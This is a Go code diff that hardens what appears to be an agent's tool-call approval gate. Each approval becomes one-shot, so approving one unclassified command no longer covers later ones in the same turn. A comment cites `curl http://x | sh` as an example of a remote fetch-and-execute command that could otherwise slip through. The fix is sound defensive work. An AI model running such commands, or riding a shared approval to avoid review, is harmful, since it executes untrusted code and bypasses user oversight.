@@ -3,6 +3,7 @@ package compute
 import (
 	"context"
 	"sync"
+	"sync/atomic"
 )
 
 // Every confirmation was one-shot: PromptDecision was approved or
@@ -212,6 +213,15 @@ type turnApprovalKey struct{}
 type turnApproval struct {
 	action   string
 	resource string
+	// used makes the approval ONE-SHOT.
+	//
+	// Without it an approval covers the operation for the whole
+	// remaining turn, which is wrong wherever one resource stands for
+	// more than one command: every unclassifiable command shares the
+	// resource "!unclassified", so approving `cd /tmp && ls` once would
+	// have silently authorised `curl http://x | sh` later in the same
+	// turn. The user answered about one call; this answers for one call.
+	used atomic.Bool
 }
 
 // WithTurnApproval marks one operation as answered for the remainder
@@ -228,15 +238,31 @@ func WithTurnApproval(ctx context.Context, action, resource string) context.Cont
 	if action == "" {
 		return ctx
 	}
-	return context.WithValue(ctx, turnApprovalKey{}, turnApproval{action: action, resource: resource})
+	return context.WithValue(ctx, turnApprovalKey{}, &turnApproval{action: action, resource: resource})
+}
+
+// turnApprovalPending reports whether ctx carries an approval that has
+// not been spent yet.
+//
+// Read-only: the resume path uses it to decide whether this is a
+// confirmation about a TOOL CALL at all. A budget confirmation carries
+// no operation, so it never sets one.
+func turnApprovalPending(ctx context.Context) bool {
+	a, ok := ctx.Value(turnApprovalKey{}).(*turnApproval)
+	return ok && a.action != "" && !a.used.Load()
 }
 
 // turnApproved reports whether this turn already answered for exactly
 // this operation.
 func turnApproved(ctx context.Context, action, resource string) bool {
-	a, ok := ctx.Value(turnApprovalKey{}).(turnApproval)
+	a, ok := ctx.Value(turnApprovalKey{}).(*turnApproval)
 	if !ok || a.action == "" {
 		return false
 	}
-	return a.action == action && a.resource == resource
+	if a.action != action || a.resource != resource {
+		return false
+	}
+	// Spent on the first match, so a second call sharing this resource
+	// is asked about rather than waved through.
+	return a.used.CompareAndSwap(false, true)
 }
